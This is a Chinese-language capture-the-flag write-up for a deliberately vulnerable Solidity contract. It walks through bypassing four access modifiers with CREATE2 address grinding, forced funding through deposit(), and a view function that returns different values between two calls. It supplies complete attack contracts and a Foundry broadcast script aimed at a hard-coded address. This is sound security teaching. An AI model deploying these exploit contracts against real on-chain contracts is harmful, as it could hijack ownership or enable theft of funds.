源码：`level.sol`

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.9;

interface Wish_Maker {
    function wish_amount() external view returns (uint256);
}

contract level {
    constructor() {
        owner = msg.sender;
    }

    string public name = "sanye";
    string public symbol = "CTF";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    address public owner;
    bool public yourname;

    mapping(address => bool) public started;
    mapping(address => uint256) public wishes;
    mapping(address => bool) public wish_made;
    mapping(address => uint8) public callCounter;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowances;

    modifier challenge_started() {
        require(started[tx.origin] == true);
        _;
    }

    modifier remains_wish() {
        require(wishes[tx.origin] > 0);
        _;
    }

    modifier onlyOwner() {
        require(owner == msg.sender);
        _;
    }

    function deposit() external payable {
        uint256 amount = msg.value;
        balanceOf[msg.sender] += amount;
        totalSupply += amount;
    }

    function allowance(address _owner, address _spender) external view returns (uint256) {
        return allowances[_owner][_spender];
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "not enough balance");
        require(allowances[from][msg.sender] >= amount, "not enough allowance");

        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        allowances[from][msg.sender] -= amount;
        return true;
    }

    function start_challenge() public {
        require(started[tx.origin] == false);
        started[tx.origin] = true;
        wishes[tx.origin] = 1;
    }

    function end_challenge(address addr) public onlyOwner {
        started[addr] = false;
        wishes[addr] = 0;
        wish_made[addr] = false;
    }

    function withdraw(uint256 amount) external payable {
        require(balanceOf[msg.sender] > amount, "not enough token");
        balanceOf[msg.sender] -= amount;
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "no call");
    }

    function approve(address from, address to, uint256 amount) external {
        allowances[from][to] = amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "not enough balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function wish_making() external challenge_started remains_wish {
        Wish_Maker wish_maker = Wish_Maker(msg.sender);
        bool is_less_than = false;
        if (wish_maker.wish_amount() < 1) {
            is_less_than = true;
        }
        wish_made[tx.origin] = true;
        if (is_less_than) {
            wishes[tx.origin] = wish_maker.wish_amount();
        } else {
            wishes[tx.origin]--;
        }
    }

    function regret() external challenge_started {
        wishes[tx.origin] = 1;
        wish_made[tx.origin] = false;
    }

    modifier level1() {
        require(tx.origin != msg.sender);
        _;
    }

    modifier level2() {
        require(uint256(uint160(msg.sender)) % 77 == 7);
        _;
    }

    modifier level3() {
        require(address(this).balance > 0);
        _;
    }

    modifier level4() {
        require(wishes[tx.origin] > 1 ? true : false == true);
        _;
    }

    receive() external payable {
        revert();
    }

    function check() external level1 level2 level3 level4 {
        owner = tx.origin;
        yourname = true;
    }

    function isSolved() external view returns (bool) {
        require(yourname == true, "no ");
        return true;
    }
}


```

目标是把`yourname`设置为`true`，调用`check`函数就可以，但是需要绕过四个修饰器，下面依次分析：

```solidity
modifier level1() {
    require(tx.origin != msg.sender);
    _;
}

modifier level2() {
    require(uint256(uint160(msg.sender)) % 77 == 7);
    _;
}

modifier level3() {
    require(address(this).balance > 0);
    _;
}

modifier level4() {
    require(wishes[tx.origin] > 1 ? true : false == true);
    _;
}
```

修饰器1，创建一个攻击合约，用攻击合约调用

修饰器2，要求一个指定的调用者，我们用create2来创建一个满足条件的合约

修饰器3，余额大于0，向合约转账是不行的，因为它的`receive`函数里面是revent，就是不接收，但是这里面有`deposit`函数，它不受`receive`限制，我们可以通过这个函数来满足余额大于0

修饰器4，wishes[tx.origin] > 1，变量`wishes`在函数`start_challenge`、`wish_making`和`regret`改变，但是`start_challenge`和`regret`只能将变量`wishes`设置为1，所以我们只能通过`wish_making`函数去改变

```solidity
function wish_making() external challenge_started remains_wish {
    Wish_Maker wish_maker = Wish_Maker(msg.sender);
    bool is_less_than = false;
    if (wish_maker.wish_amount() < 1) {
		is_less_than = true;
	}
	wish_made[tx.origin] = true;
	if (is_less_than) {
		wishes[tx.origin] = wish_maker.wish_amount();
	} else {
    	wishes[tx.origin]--;
    }
}
```

这个函数调用之后在内部调用`wish_amount`函数，需要在调用后返回值小于1，但是在修改`wishes`时，返回值小于1又不满足解题条件，关键在这个函数是接口函数，因此我们可以设计让第一次调用时返回0，第二次调用返回2，简单的计数器就可以，但问题又出现在这个函数是一个`view`，不可以修改值，`wish_making`函数的里面`wish_made[tx.origin] = true`，把这个变量设置为`true`，它出现在两次调用之间，因此我们可以用这个变量做一些事情：

```solidity
function wish_amount() external view override returns (uint256) {
    if(!target.wish_made(tx.origin)) {
    	return 0;
    }
	return 2;
}
```

解决了这些问题，解决调用`wish_making`需要绕过的修饰器，很简单只需要调用`start_challenge`函数就都解决了

`createtwo.sol`

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {level} from "./level.sol";
import {Attack} from "./Attack.sol";

contract Deployer {
    function computeSalt(address target) public view returns (bytes32) {
        for (uint256 i = 0; i < 10000; i++) {
            bytes32 salt = bytes32(i);
            address predictedAddress = predictAddress(salt, target);
            if (uint256(uint160(predictedAddress)) % 77 == 7) {
                return salt;
            }
        }
        revert("No suitable salt found within the limit");
    }

    function predictAddress(
        bytes32 salt,
        address example
    ) public view returns (address) {
        bytes memory bytecode = abi.encodePacked(
            type(Attack).creationCode,
            abi.encode(example)
        );

        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff),
                address(this), 
                salt,
                keccak256(bytecode)
            )
        );
        return address(uint160(uint256(hash)));
    }

    function deployer(
        bytes32 salt,
        address paekkoAddress
    ) public returns (address) {
        Attack a = new Attack{salt: salt}(paekkoAddress);
        return address(a);
    }
}
```

攻击合约：`Attack.sol`

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.9;

import {level, Wish_Maker} from "./level.sol";
import {Script, console} from "forge-std/Script.sol";

contract Attack is Wish_Maker{
    level target;
    constructor(address _target) {
        target = level(payable(_target));
    }

    function attack() external payable {
        target.deposit{value: 0.1 ether}();
        target.start_challenge();
        target.wish_making();
        target.check();
    }

    function wish_amount() external view override returns (uint256) {
        if(target.wish_made(tx.origin) == false) {
            return 0;
        }
        return 2;
    }
}
```

脚本：`Hack.s.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.9;

import {Script, console} from "forge-std/Script.sol";
import {Attack} from "../src/Attack.sol";
import {Deployer} from "../src/createtwo.sol";
import {level} from "../src/level.sol";

contract POC is Script {
    function run() external {
        vm.startBroadcast();

        Deployer deployer = new Deployer();
        level target = level(payable(0x4bfaFe49347319fa45bFF0A0912d1DD0BFE95f02));
        bytes32 salt = deployer.computeSalt(
            address(target)
        );
        address attack = deployer.deployer(
            salt,
            address(target)
        );
        Attack(attack).attack{value: 0.1 ether}();
        console.log(target.isSolved());

        vm.stopBroadcast();
    }
}
```

